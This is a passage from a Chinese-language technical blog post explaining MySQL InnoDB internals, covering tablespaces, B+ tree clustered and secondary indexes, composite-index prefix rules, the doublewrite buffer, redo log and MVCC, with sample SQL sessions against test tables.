-&gt; ) engine=InnoDB;Query OK, 0 rows affected (0.02 sec)mysql&gt; insert into tbl_test_1 values(9, &#39;name9&#39;);mysql&gt; insert into tbl_test_1 values(2, &#39;name2&#39;);mysql&gt; insert into tbl_test_1 values(5, &#39;name5&#39;);mysql&gt; insert into tbl_test_1 values(1, &#39;name1&#39;);</code></pre><p>接着查询表中所有数据。</p><pre><code class="mysql">mysql&gt; select * from tbl_test_1;+----+-------+| id | name  |+----+-------+|  1 | name1 ||  2 | name2 ||  5 | name5 ||  9 | name9 |+----+-------+4 rows in set (0.00 sec)</code></pre><p>可以看到其中的数据排列顺序是完全按照主键来的。</p><blockquote><p>注意，<code>_rowid</code> 字段只有在存在非隐含主键的情况下才存在。</p></blockquote><pre><code class="mysql">mysql&gt; select id,_rowid,name from tbl_test_1;+----+--------+-------+| id | _rowid | name  |+----+--------+-------+|  1 |      1 | name1 ||  2 |      2 | name2 ||  5 |      5 | name5 ||  9 |      9 | name9 |+----+--------+-------+4 rows in set (0.00 sec)</code></pre><p>发现 <code>_rowid</code> 列的内容与主键等同。</p><p>我们再尝试创建没有主键的表。</p><pre><code class="mysql">mysql&gt; create table tbl_test_2 (    -&gt; id int,    -&gt; age int    -&gt; );Query OK, 0 rows affected (0.02 sec)insert into tbl_test_2 values(9, 99);insert into tbl_test_2 values(2, 22);insert into tbl_test_2 values(5, 55);insert into tbl_test_2 values(1, 11);</code></pre><p>查询该表和 <code>_rowid</code> 列。</p><pre><code class="mysql">mysql&gt; select * from tbl_test_2;+------+------+| id   | age  |+------+------+|    9 |   99 ||    2 |   22 ||    5 |   55 ||    1 |   11 |+------+------+4 rows in set (0.00 sec)mysql&gt; select _rowid from tbl_test_2;ERROR 1054 (42S22): Unknown column &#39;_rowid&#39; in &#39;field list&#39;</code></pre><p>可见行的存储顺序现在等同于插入顺序，并且 <code>_rowid</code> 字段无法查询到了。</p><blockquote><p>查看某个 InnoDB 表的相关属性信息，使用 <code>SHOW TABLE STATUS;</code> 语句：</p><pre><code class="mysql">mysql&gt; use mysql;Database changedmysql&gt; show table status;</code></pre><p>可以根据条件过滤并格式化输出：</p><pre><code class="mysql">mysql&gt; use mysql;Database changedmysql&gt; show table status where name=&#39;user&#39; \G;*************************** 1. row ***************************        Name: user      Engine: MyISAM     Version: 10  Row_format: Dynamic        Rows: 3Avg_row_length: 132 Data_length: 396Max_data_length: 281474976710655Index_length: 4096   Data_free: 0Auto_increment: NULL Create_time: 2021-10-22 16:22:16 Update_time: 2021-10-22 16:22:19  Check_time: NULL   Collation: utf8_bin    Checksum: NULLCreate_options:     Comment: Users and global privileges1 row in set (0.00 sec)</code></pre></blockquote><h4 id="行格式"><a href="#行格式" class="headerlink" title="行格式"></a>行格式</h4><p>行格式部分参见 <a href="/undefined/" title="InnoDB Row Formats">InnoDB Row Formats</a> 。</p><h3 id="表空间"><a href="#表空间" class="headerlink" title="表空间"></a>表空间</h3><p>不同于索引这个用于存储数据的<strong>物理存储结构</strong>，表空间（tablespace）是存储数据的<strong>逻辑存储结构</strong>。在 InnoDB 中，所有的数据都逻辑上被存放在一个空间中，即表空间。表空间由段（segment）、区（extent）、页（page）组成。</p><p>如果启用了 <code>innodb_file_per_table</code> 参数，每张表内的数据可以单独放到不同的表空间内，反之 InnoDB 有一个共享表空间 idbata1，数据都可以放在这里。</p><h4 id="页"><a href="#页" class="headerlink" title="页"></a>页</h4><p>每个表空间由很多的页组成。MySQL 实例中的每个表空间都具有相同的页大小，通常为 16KB。</p><p>页格式部分参见 <a href="/undefined/" title="InnoDB Page Formats">InnoDB Page Formats</a> 。</p><h4 id="区"><a href="#区" class="headerlink" title="区"></a>区</h4><p>区是由多个连续页组成的空间。对于最大为 16KB 的页（64 个连续的 16KB 页、128 个 8KB 页，或 256 个 4KB 页），这些页面被分组到大小为 1MB 的区中。对于 32KB 的页，扩展区大小为 2MB。对于 64KB 的页，扩展区大小为 4MB。</p><h4 id="段"><a href="#段" class="headerlink" title="段"></a>段</h4><p>表空间中的“文件”在 InnoDB 中被称为段（这些段与回滚段不同，回滚段实际上包含许多表空间段）。常见的段有数据段、索引段、回滚段等。数据段即 InnoDB 索引 B+ 树的叶子结点，索引段即 B+ 树的非叶子结点。当一个段在表空间内增长时，InnoDB 一次性分配前 32 页给它。之后，InnoDB 开始为段分配整个范围。 InnoDB 一次最多可以将 4 个区添加到一个大段中，以确保数据具有良好的有序性。</p><h4 id="系统表空间"><a href="#系统表空间" class="headerlink" title="系统表空间"></a>系统表空间</h4><p>系统表空间是 InnoDB 数据字典（data dictionary）、双写缓冲区（doublewrite buffer）、写缓冲区（change buffer）和撤消日志（undo logs）的存储区域。如果表是在系统表空间中创建的，而不是在单表文件（file-per-table）或通用表空间（general tablespaces）中创建，则它还可能包含表（table）和索引数据（index data）。</p><p>系统表空间中可以有一个或多个数据文件。默认情况下，会在数据目录中创建一个名为 ibdata1 的系统表空间数据文件。系统表空间数据文件的大小和数量由 <code>innodb_data_file_path</code> 启动选项定义。</p><h4 id="单表文件表空间"><a href="#单表文件表空间" class="headerlink" title="单表文件表空间"></a>单表文件表空间</h4><p>单表文件表空间（file-per-table tablespace）包含单个 InnoDB 表的数据和索引，并存储在文件系统上的单个数据文件中。</p><h4 id="通用表空间"><a href="#通用表空间" class="headerlink" title="通用表空间"></a>通用表空间</h4><h4 id="Undo-表空间"><a href="#Undo-表空间" class="headerlink" title="Undo 表空间"></a>Undo 表空间</h4><h4 id="临时表空间"><a href="#临时表空间" class="headerlink" title="临时表空间"></a>临时表空间</h4><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><h4 id="索引原理"><a href="#索引原理" class="headerlink" title="索引原理"></a>索引原理</h4><p>索引最主要的目的在于快速定位，尽可能加快查询过程。根据基本的数据结构知识，我们知道有诸如 AVL 树、BST（二叉搜索树）等数据结构可以用于快速查询，但这些数据结构都没有对实际情况进行讨论。持久化到硬盘的数据库需要考虑磁盘的相关特性。MySQL 作为一个持久化数据库，为了提升效率，最需要考虑的是其底层存储结构对磁盘 I/O 的影响。</p><p>磁盘（机械硬盘）读取数据靠的是磁头与盘片的机械运动，每次读取数据花费的时间可以分为寻道时间、旋转延迟、传输时间三个部分。寻道时间指的是磁臂移动到指定磁道所需要的时间，主流磁盘一般在 5 ms 以下。旋转延迟即盘片旋转让磁头到达 I/O 请求所请求的起始数据块位置所需的时间，比如一个磁盘旋转速度为每分钟 7200 转，即平均每秒转 120 次，平均旋转延迟就是 ${1\over(120\times2)} = {4.17ms}$。传输时间指的是从磁盘读出或将数据写入磁盘的时间，一般小于 1 ms，相对来说可以忽略不计。因此，在数据库数据访问量较大的情况下，大量磁盘 I/O 会导致查询效率严重降低。另外，随机读写效率远比顺序读写的效率低。因此，减少磁盘 I/O 次数并使数据尽可能聚集，是提高性能的关键点。</p><p>基于计算机领域相当常用的<strong>局部性原理</strong>，我们通过<strong>预读</strong>来减少磁盘 I/O 次数，即每次读取磁盘上的数据时，将相邻位置的数据（多个页）也同时缓存下来。实践表明，预读的机制能有效降低磁盘 I/O 带来的开销。</p><blockquote><p>注意，预读是操作系统层面实现并提供的机制，并非数据库系统提供。另外，预读的磁盘页和 InnoDB 中的页并非同一概念，请勿混淆，前者是操作系统中文件管理部分的概念。</p></blockquote><p>综上所述，在磁盘上使用的索引结构必须有较少的 I/O 次数，MySQL 采用了 B+ 树作为其索引数据结构。</p><blockquote><p>本节中，需要重点注意<strong>局部性原理</strong>以及磁盘 I/O 的开销，这是 MySQL 采用 B/B+ 树索引的根本原因。</p></blockquote><h4 id="聚集索引和二级索引"><a href="#聚集索引和二级索引" class="headerlink" title="聚集索引和二级索引"></a>聚集索引和二级索引</h4><h5 id="聚集索引"><a href="#聚集索引" class="headerlink" title="聚集索引"></a>聚集索引</h5><p>每个 InnoDB 表<strong>都有且只有一个</strong>被称为聚集索引（clustered index）的特殊索引，用于存储行数据（这个索引的每个项存储了整个数据行，而非部分列的值）。</p><blockquote><p>对于 B+ 树，聚集索引就是将表中数据按照指定的键顺序存放在 B+ 树的叶子结点的数据页中，这个数据页保存了整个行记录的数据，因此想要查找某条记录的任何一个列的值，都可以在聚集索引结果中找到。聚集索引就是 InnoDB 存储实际存放所有数据的地方。</p></blockquote><p>通常，聚集索引就是主键索引。为了在查询、插入和其他数据库操作中获得最佳性能，了解 InnoDB 如何使用聚集索引优化常见的查找和 DML 操作非常重要。</p><ul><li>在表上定义主键时，InnoDB 把它用作聚集索引。如果没有符合条件（逻辑唯一、非空）的列作为主键，可以添加一个自增的列用作主键，并且插入新行时自增列会自动设置其值。</li><li>如果不为表定义主键，InnoDB 会使用第一个唯一索引（所有键定义为 <code>NOT NULL</code>）作为聚集索引。</li><li>如果表没有主键或合适的唯一索引，InnoDB 将在包含行 ID 值的合成列上生成一个名为 <code>GEN_CLUST_INDEX</code> 的隐藏聚集索引。这些行按 InnoDB 分配的行 ID 排序。行 ID 是一个 6 字节的字段，随着新行的插入而单调增加。因此，按行 ID 排序的行实际上是按插入顺序排列的。</li></ul><p>通过聚集索引访问行非常快，因为索引搜索直接指向包含行数据的页面。如果表很大，则与使用不同于索引记录的页面存储行数据的存储组织相比，聚集索引体系结构通常可以明显减少磁盘 I/O 操作的开销。</p><h5 id="二级索引"><a href="#二级索引" class="headerlink" title="二级索引"></a>二级索引</h5><p>聚集索引以外的索引都称为二级索引（secondary index，又称非聚集索引 non-clustered index）。在 InnoDB 中，二级索引中的每条记录都包含该行的主键列，以及为二级索引指定的列。InnoDB 使用此主键值搜索聚集索引中的行。也就是说，使用二级索引查询需要进行两次查询过程，先通过二级索引查到所需行的主键，再用主键通过聚集索引查到所需行的所需列值，该操作被称为<strong>回表</strong>。</p><p>如果主键较长，则二级索引将占用更多的空间，因此<strong>应当使用空间占用尽量小的主键</strong>。</p><h4 id="索引的物理结构"><a href="#索引的物理结构" class="headerlink" title="索引的物理结构"></a>索引的物理结构</h4><h5 id="InnoDB-索引结构"><a href="#InnoDB-索引结构" class="headerlink" title="InnoDB 索引结构"></a>InnoDB 索引结构</h5><p>除了空间索引（spatial indexes），InnoDB 索引都采用 B-Tree 数据结构。空间索引使用 R-Tree，这是用于索引多维数据的专用数据结构。索引记录存储在其 B-Tree 或 R-Tree 数据结构的叶子结点页中。索引页的默认大小为 16KB。初始化 MySQL 实例时，页面大小由 <code>innodb_page_size</code> 设置项确定。</p><blockquote><p>关于空间索引，这是一种用于存储地理空间信息的专用索引，在本文不进行讨论。</p></blockquote><blockquote><p>关于 B-Tree（即 B 树）的详细介绍不在本文讨论范围内，但有一点需要指出，在 MySQL 官方文档中有这么一句话：“使用术语 B-Tree 旨在为索引设计提供一般类别的参考。由于 InnoDB 索引使用的存储结构具有经典的 B-Tree 设计中不存在的某些复杂特性，因此 InnoDB 使用的 B-Tree 结构可能被视为变体。”</p><p>也就是说在文档中使用 B-Tree 这个词是学术需要，实际使用的存储结构并不能算是 B-Tree，实际要更复杂。</p><p>在文档中还有一段文字：“人们知道 B-Tree 根结点页中的条目指向叶结点页，但有时忽略了叶子结点页也可以相互指向的细节。这个特性允许 InnoDB 在叶子结点与叶子结点之间相互定位，而无需回到上层结点。这是你在经典的 B-Tree 中看不到的设计，这就是为什么 InnoDB 使用的索引应该被称为 B+ 树索引的原因。”</p><p>综上所述，InnoDB 实际使用的索引其物理结构应当为 B+ 树，而不是 B-Tree，本文中仅本节使用了术语 B-Tree，其他章节都直接使用 B+ 树来替代。</p></blockquote><p>B+ 树由 B 树和索引顺序访问方法（ISAM）演化而来，现实中 B 树已经很少被使用了。</p><blockquote><p>这里介绍一个数据结构可视化网站，下面给出其中 B 树与 B+ 树的页面链接。<br>B 树可视化：<a href="https://www.cs.usfca.edu/~galles/visualization/BTree.html">https://www.cs.usfca.edu/~galles/visualization/BTree.html</a><br>B+ 树可视化：<a href="https://www.cs.usfca.edu/~galles/visualization/BPlusTree.html">https://www.cs.usfca.edu/~galles/visualization/BPlusTree.html</a></p></blockquote><p>本文不对 B+ 树作详细介绍，下面是 B+ 树的图示，我们简要地对 B+ 树的部分特性做个列举：</p><p><img src="/basics-of-innodb/image-20211102214806730.png" class="lazyload" data-srcset="/basics-of-innodb/image-20211102214806730.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211102214806730"></p><ul><li>B+ 树的所有记录结点都在同一层，且位于叶子结点上。</li><li>B+ 树的叶子结点按索引键的大小顺序排序。</li><li>B+ 树的叶子结点以双向链表连接。</li><li>B+ 树的叶子结点头尾相连。</li><li>B+ 树的上层节点按照同样的排序规则存储了下层节点的地址。</li></ul><p>B+ 树具有高扇出性，只需要很少的层数，就可以存储相当数量的数据。在数据库中，B+ 树的高度一般在 2 ~ 4 层，因此读取一个页最多也只需要 2 ~ 4 次 I/O 操作。</p><blockquote><p>这边涉及到一个问题，那就是为什么 MySQL 不使用纯粹的 B 树，而是选用了 B+ 树作索引。</p><ol><li>因为磁盘 I/O 顺序读取一整块区域，因此数据更为聚集（都在叶子结点中）的 B+ 树性能更好。</li><li>由于 B+ 树的非叶子节点不存储目标数据，因此能存放更多的索引结点，使得整个 B+ 树的层级更少，即 I/O 次数更少。</li><li>所有查询都要查找到叶子节点，查询性能稳定。</li><li>所有叶子节点形成有序双向链表，便于范围查询。</li></ol></blockquote><p>当新记录（records）插入到 InnoDB 聚集索引中时，InnoDB 会尝试保留页面 1/16 的空间，以便将来插入和更新索引记录。如果按顺序（升序或降序）插入索引记录，则生成的索引页大约 15/16 页即装满。如果以随机顺序插入记录，则页面从 1/2 页至 15/16 页不等即装满。</p><p>InnoDB 在创建或重建（rebuilding）B-Tree 索引时执行批量加载（bulk load）。这种创建索引的方法称为<strong>有序索引构建</strong>（ <em>sorted index build</em> ）。<code>innodb_fill_factor</code> 变量定义了在有序索引构建期间填充的每个 B-Tree 页面上可使用空间的百分比，剩余空间保留用于未来的索引增长。空间索引不支持有序索引构建。<code>innodb_fill_factor</code> 设置为 100 则会留下聚集索引页中 1/16 的空间用于将来的索引增长。</p><p>如果 InnoDB 索引页面的填充因子（fill factor，即实际的页使用空间占比）低于 <code>MERGE_THRESHOLD</code>（如果未指定，默认为 50%），InnoDB 会尝试收缩索引树以释放页面空间。 <code>MERGE_THRESHOLD</code> 设置适用于 B-Tree 和 R-Tree 索引。</p><p>B+ 树的叶子结点中存储的是一整个索引页，其中可能包含多行记录，数据库会把整个页读入内存，再从中取得指定的记录。并且，由于 B+ 树叶子结点是由链表组织的，因此它们无需在磁盘中物理连续，只需要保证逻辑上连续就可以了。</p><p>进行范围查找时，由于 B+ 树按顺序组织，因此找到范围的边界，再从该边界直接由叶子结点的双向链表向前或向后遍历即可，不需要对范围内的每个数据都进行多层的查找。进行排序查找时也是类似的操作，效率非常高。</p><p>下图是 InnoDB 中 B+ 树叶子结点组织的逻辑结构，它们直接用双向链表关联起来。</p><p><img src="/basics-of-innodb/image-20211107131405462.png" class="lazyload" data-srcset="/basics-of-innodb/image-20211107131405462.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211107131405462"></p><p>在数据较少的情况下，只使用一个页，可以应用单页查找的规则，这在 InnoDB 页格式中已经说明了。但当数据增加，占用了多个页时，就需要通过两个步骤查找目标数据：</p><ol><li>查找数据所在的页。</li><li>从单页中查找数据。</li></ol><p>InnDB 的叶子结点与非叶子节点是相同的，但是非叶子节点页中的每一行并不是用于存储数据，而是用于定位下一层。非叶子结点使用行格式中某些特定字段来标识其类型，将其与叶子结点区分开。</p><h5 id="B-树索引分裂"><a href="#B-树索引分裂" class="headerlink" title="B+ 树索引分裂"></a>B+ 树索引分裂</h5><p>如下面的一些顺序存储记录：</p><pre><code>1 2 3 4 5 6 7 8 9</code></pre><p>假设当插入记录 10 时，空间不足需要进行页分裂，根据 B+ 树的默认从中间分裂的方式，会分裂为下面的记录：</p><pre><code>1 2 3 45 6 7 8 9 10</code></pre><p>这显然会浪费大量存储空间，因此 InnoDB 并不会这样进行分裂。InnoDB 的 Page Header 中，有几个和页分裂相关的字段：</p><ul><li>PAGE_LAST_INSERT：最后插入记录的位置</li><li>PAGE_DIRECTION：记录插入的方向</li><li>PAGE_N_DIRECTION：一个方向连续插入的记录数量</li></ul><p>通过这几个信息，InnoDB 可以判断是该向哪个方向进行分裂，并决定一个分裂点。如果插入随机的话，取页的中间记录作为分裂点。</p><h4 id="索引管理"><a href="#索引管理" class="headerlink" title="索引管理"></a>索引管理</h4><blockquote><p>索引的创建放在 <a href="/basics-of-mysql/" title="The Basics of MySQL">The Basics of MySQL</a> 介绍。</p></blockquote><p>通过 <code>SHOW INDEX FROM tbl_name\G;</code> 可以查询表 tbl_name 中的索引信息。</p><pre><code class="mysql">mysql&gt; show index from idx_test\G;*************************** 1. row ***************************        Table: idx_test   Non_unique: 0     Key_name: idx Seq_in_index: 1  Column_name: age    Collation: A  Cardinality: 2     Sub_part: NULL       Packed: NULL         Null:   Index_type: BTREE      Comment:Index_comment:1 row in set (0.00 sec)</code></pre><p>除去一些基础信息，需要注意的地方有以下几个：</p><ul><li>Non_unique：非唯一的索引，这里是 0，表示索引全都是唯一索引</li><li>Seq_in_index：索引中该列的位置，对于联合索引会有用</li><li>Column_name： 索引列的名称</li><li>Collation：列是以什么方式存储在索引中，值可以是 A 或 NULL。B+ 树索引总是 A，即排序的</li><li>Cardinality：表示索引中唯一值的数目的估计值</li><li>Sub_part：是否是列的部分被索引，这里是 NULL 表示整个列的内容都被索引了。例如对一个字符串索引显示 10，则表示只对其前 10 个字符进行索引</li><li>Null：是否含有 NULL 值</li><li>Index_type：索引类型，BTREE 就是 B+ 树</li></ul><p>其中，Cardinality 是对索引中唯一值数量的估计。要更新此数字，可以执行 <code>ANALYZE TABLE</code> 或 <code>myisamchk -a</code>（对于 MyISAM 表）。Cardinality 是根据存储为整数的统计信息计算的，因此即使对于小表，该值也不一定准确。Cardinality 越高，MySQL 在进行连接时使用索引的机会就越大。由于测试数据只有两条，都是唯一值，因此上面的 Cardinality 显示的是正确的 2。</p><blockquote><p>由于 Cardinality 的不准确性，可以在数据库非高峰期执行 <code>ANALYZE TABLE</code> 来帮助优化器和索引更好地工作。</p></blockquote><p>TODO: Cardinality</p><h4 id="有序索引构建"><a href="#有序索引构建" class="headerlink" title="有序索引构建"></a>有序索引构建</h4><p>TODO</p><h4 id="联合索引"><a href="#联合索引" class="headerlink" title="联合索引"></a>联合索引</h4><p>联合索引是指对表上的多个列进行索引，与单个列作为键的索引不同之处仅在于有多个索引列。</p><p>如联合索引 (a, b) 在 B+ 树上排列时，会先按照 a 顺序排列，再按照 b 顺序排列。</p><h5 id="最左前缀原则"><a href="#最左前缀原则" class="headerlink" title="最左前缀原则"></a>最左前缀原则</h5><p>对于联合索引 <code>INDEX(a, b, c)</code>：</p><table><thead><tr><th align="center">Where 语句</th><th align="center">索引是否被使用</th><th align="center">使用的索引</th></tr></thead><tbody><tr><td align="center"><code>where a = 3</code></td><td align="center">Yes</td><td align="center">a</td></tr><tr><td align="center"><code>where a = 3 and b = 5</code></td><td align="center">Yes</td><td align="center">a, b</td></tr><tr><td align="center"><code>where a = 3 and b = 5 and c = 4</code></td><td align="center">Yes</td><td align="center">a, b, c</td></tr><tr><td align="center"><code>where b = 5 and a = 3 and c = 4</code></td><td align="center">Yes</td><td align="center">a, b, c</td></tr><tr><td align="center"><code>where b = 3</code> 或 <code>where b = 3 and c = 4</code> 或 <code>where c = 4</code></td><td align="center">No</td><td align="center"></td></tr><tr><td align="center"><code>where a = 3 and c = 5</code></td><td align="center">Yes</td><td align="center">a</td></tr><tr><td align="center"><code>where a = 3 and b &gt; 4 and c = 5</code></td><td align="center">Yes</td><td align="center">a, b</td></tr><tr><td align="center"><code>where a = 3 and b like &#39;kk%&#39; and c = 4</code></td><td align="center">Yes</td><td align="center">a, b, c</td></tr><tr><td align="center"><code>where a = 3 and b like &#39;%kk&#39; and c = 4</code></td><td align="center">Yes</td><td align="center">a</td></tr><tr><td align="center"><code>where a = 3 and b like &#39;%kk%&#39; and c = 4</code></td><td align="center">Yes</td><td align="center">a</td></tr><tr><td align="center"><code>where a = 3 and b like &#39;k%kk%&#39; and c = 4</code></td><td align="center">Yes</td><td align="center">a, b, c</td></tr><tr><td align="center"><code>where a like &#39;%kk&#39; and b = 3 and c = 4</code></td><td align="center">No</td><td align="center"></td></tr></tbody></table><p>根据以上示例，我们总结：</p><ul><li>如使用了后面的索引，则前面的索引必被使用；</li><li>对于 <code>&#39;%k&#39;</code> 类通配符，由于并不能直接匹配，因此无法使用索引；</li><li>where 语句中的字段顺序并不影响结果，MySQL 优化器会对语句进行排序。</li></ul><h4 id="覆盖索引"><a href="#覆盖索引" class="headerlink" title="覆盖索引"></a>覆盖索引</h4><p>当用户所需的列本身就是二级索引的键时，就没有必要再对聚集索引进行查询了，可以直接返回。二级索引中包含所需要查找的列，不需要进行回表操作，称为<strong>覆盖索引</strong>。</p><h3 id="双写缓冲"><a href="#双写缓冲" class="headerlink" title="双写缓冲"></a>双写缓冲</h3><p>双写缓冲（Doublewrite Buffer）是一个存储区域，InnoDB 在将页写入 InnoDB 数据文件中的适当位置之前，在其中写入从缓冲池中刷新的页面。如果在页写入磁盘的过程中出现操作系统崩溃、存储子系统退出或 mysqld 进程意外退出，InnoDB 可以在崩溃恢复（crash recovery）期间从双写缓冲区中找到页的可用副本。</p><p>如果没有双写缓冲区，发生某些异常时，可能 InnoDB 正在将一个页从 Buffer Pool 写入到表空间中。由于磁盘的单次写入数据量多半小于页大小（通常为 16KB），它很可能只写了页的一部分，从而导致数据丢失。</p><blockquote><p>由于 redo log 恢复过程是对数据页进行操作，因此当页损坏时，它不能用于恢复页数据。</p></blockquote><p>在本文使用的版本中，双写缓冲位于系统表空间中，大小一般是 2MB。使用双写缓冲机制，脏页（Buffer Pool 中已经被修改但并未持久化的页）会先通过 <code>memcpy()</code> 复制到磁盘上的双写缓冲区，之后分两次，每次 1MB 顺序写入数据文件中，接着马上调用 <code>fsync()</code> 同步磁盘。</p><p>虽然数据被写入磁盘两次，但双写缓冲并不需要两倍的 I/O 开销或两倍的 I/O 操作。数据以大顺序块（large sequential chunk）写入双写缓冲区，对操作系统进行单个 <code>fsync()</code> 系统调用（除非 <code>innodb_flush_method</code> 设置为 <code>O_DIRECT_NO_FSYNC</code>）。</p><p>在大多数情况下，默认启用双写缓冲。要禁用双写缓冲，需要将 <code>innodb_doublewrite</code> 设置为 0。</p><p>如果系统表空间文件（ibdata 文件）位于支持原子写入的 Fusion-io 设备上，则会自动禁用双写缓冲，并对所有数据文件使用 Fusion-io 原子写入。由于双写缓冲设置是全局的，因此对于放在非 Fusion-io 硬件上的数据文件，双写缓冲也被禁用。此功能仅在 Fusion-io 硬件上受支持，并且仅在 Linux 上为 Fusion-io NVMFS 启用。要充分利用此功能，建议使用 <code>O_DIRECT</code> 的 <code>innodb_flush_method</code> 设置。</p><p>当页写入时出现崩溃，InnoDB 会从双写缓冲区中找到该页的一个副本复制到表空间，再应用 redo log。</p><h3 id="Redo-Log"><a href="#Redo-Log" class="headerlink" title="Redo Log"></a>Redo Log</h3><p>在<a href="#%E6%97%A5%E5%BF%97%E7%BC%93%E5%86%B2">日志缓冲</a>部分已经介绍了 redo log 在内存中的部分，本节将介绍 redo log 持久化到磁盘上的部分。</p><p>redo log 是一种基于磁盘的数据结构，用于在崩溃恢复期间纠正不完整事务写入的数据。在正常操作期间，rego log 对由 SQL 语句或低级 API 调用产生的<strong>更改表数据的请求</strong>进行<strong>编码</strong>。在初始化期间和接受连接之前（这里指数据库初始化以及接受 MySQL 客户端连接），会自动重做在意外关闭之前对数据文件未完成的修改。</p><p>默认情况下，redo log 在磁盘上由两个名为 <em>ib_logfile0</em> 和 <em>ib_logfile1</em> 的文件物理表示。MySQL 以循环方式写入重做日志文件。redo log 中的数据按照受影响的记录进行编码，这些数据统称为重做（redo）。通过 redo log 的数据通道由不断增加的 LSN 值表示。</p><blockquote><p>上面提到的编码，指的是将操作（更改表数据的请求）进行编码存储，比如把<strong>将 tbx 表空间的 page#n 页，偏移 offset 位置的数据更新为 xxx</strong> 编码成一段二进制数据，存储在 redo log 中，使得最终 redo log 占用的空间很少。执行事务时产生的修改操作会按照顺序写入 redo log。</p></blockquote><p>redo log 的大小是固定的，由 <code>innodb_log_file_size</code> 变量决定。在 Linux 下的 <em>my.cnf</em> 或 Windows 下的 <em>my.ini</em> 配置文件中，可以配置该字段。修改该数值并重启 MySQL 服务后，如果 InnoDB 检测到 <code>innodb_log_file_size</code> 与 redo log 文件大小不同，它会写入日志检查点，关闭并删除旧日志文件，以请求的大小创建新日志文件，并打开新日志文件。</p><p>InnoDB 与任何其他实现 ACID 的数据库存储引擎一样，在提交事务之前刷新（flush）事务的 redo log。InnoDB 使用组提交（group commit）功能将多个刷新请求组合在一起，以避免每次提交一次刷新。通过组提交，InnoDB 向日志文件发出一次写入，以对大约同时提交的多个用户事务执行提交操作，从而显着提高吞吐量。</p><h3 id="Undo-Logs"><a href="#Undo-Logs" class="headerlink" title="Undo Logs"></a>Undo Logs</h3><h2 id="InnoDB-Multi-Versioning"><a href="#InnoDB-Multi-Versioning" class="headerlink" title="InnoDB Multi-Versioning"></a>InnoDB Multi-Versioning</h2><blockquote><p><code>InnoDB</code> is a multi-version storage engine. It keeps information about old versions of changed rows to support transactional features such as concurrency and rollback. This information is stored in the system tablespace or undo tablespaces in a data structure called a rollback segment. <code>InnoDB</code> uses the information in the rollback segment to perform the undo operations needed in a transaction rollback. It also uses the information to build earlier versions of a row for a consistent read.</p><p>InnoDB 是一个多版本存储引擎。它保留有关已更改行的旧版本信息，以支持事务性功能，如并发（concurrency）和回滚（rollback）。此信息存储在系统表空间或撤消（undo）表空间称为回滚段（rollback segment）的数据结构中。InnoDB 使用回滚段中的信息执行事务回滚所需的撤消操作。它还使用这些信息构建行的早期版本，以实现一致的读取。</p></blockquote><p>InnoDB 在内部向数据库中存储的每一行添加三个字段：</p><ul><li><p>6 字节的 <code>DB_TRX_ID</code> 字段表示插入或更新行的最后一个事务的事务标识符。此外，删除在内部被视为更新，行中的特殊位设置标记为已删除。</p></li><li><p>7 字节的 <code>DB_ROLL_PTR</code> 字段，称为滚动指针。滚动指针指向写入回滚段的撤消日志（undo log）记录。如果行已更新，则撤消日志记录包含更新前重建行内容所需的信息。</p></li><li><p>6 字节的 <code>DB_ROW_ID</code> 字段包含一个随着插入新行而单调增加的行 ID。如果 InnoDB 自动生成聚集索引，则该索引包含行 ID 值。否则，<code>DB_ROW_ID</code> 列不会出现在任何索引中。</p><blockquote><p>当用户没有<strong>显式指定主键</strong>且表中不存在<strong>非空唯一索引</strong>时，InnoDB 会自动生成聚集索引，使用的主键是 <code>DB_ROW_ID</code>。</p></blockquote></li></ul><p>回滚段中的 undo log 分为 <em>insert undo log</em> 和 <em>update undo log</em> 。insert undo log 仅在事务回滚中需要，并且可以在事务提交后立即丢弃。update undo log 也用于一致性读取，但只有在当前不存在 InnoDB 已为其分配快照的事务时，才能丢弃 update undo log。在一致性读取中，快照可能需要更新撤消日志中的信息来构建数据库行的早期版本。</p><p>建议定期提交事务，包括仅发出一致读取的事务。否则，InnoDB 无法丢弃 update undo log 中的数据，回滚段可能会变得太大，填满它所在的表空间。</p><p>回滚段中 undo log 记录的物理大小通常小于相应的插入或更新行。可以使用此信息计算回滚段所需的空间。</p><p>在 InnoDB 多版本控制方案中，使用 SQL 语句删除某一行时，该行不会立即从数据库中物理删除。InnoDB 仅在丢弃<strong>为了删除操作而写入</strong>的 update undo log 记录时，才从物理上删除相应的行及其索引记录。此删除操作称为清除（purge），速度相当快，通常与执行删除的 SQL 语句的时间顺序相同。</p><p>如果以大约相同的速率在表中小批量插入和删除行，则清除线程可能会开始落后，并且由于这些“死（dead）”行的存在，表可能会变得越来越大，使所有内容都绑定在磁盘上并且速度非常慢。在这种情况下，通过调整 <code>innodb_max_purge_lag</code> 系统变量来限制新行操作，并为清除线程分配更多资源。</p><h3 id="MVCC-和二级索引"><a href="#MVCC-和二级索引" class="headerlink" title="MVCC 和二级索引"></a>MVCC 和二级索引</h3><p>InnoDB 多版本并发控制（MVCC）处理二级索引的方式与处理聚集索引的方式不同。聚集索引中的记录会就地更新，其隐藏的系统列指向撤消日志项，从中可以重构早期版本的记录。与聚集索引记录不同，二级索引记录不包含隐藏的系统列，也不进行就地更新。</p><p>更新二级索引列时，旧的二级索引记录将被标记为删除，新记录将被插入，删除标记的记录最终将被清除。当二级索引记录被标记为删除，或者二级索引页被较新的事务更新时，InnoDB 会在聚集索引中查找数据库记录。在聚集索引中检查记录的 <code>DB_TRX_ID</code>，如果在读取事务启动后修改了记录，则从 undo log 中检索记录的正确版本。</p><p>如果二级索引记录被标记为删除，或者二级索引页由较新的事务更新，则不使用覆盖索引（covering index）技术。InnoDB 不会从索引结构返回值，而是在聚集索引中查找记录。</p><p>但是，如果启用了索引条件下推（ICP）优化，并且只能使用索引中的字段来评估 <code>WHERE</code> 条件的一部分，MySQL 服务器仍然会将 <code>WHERE</code> 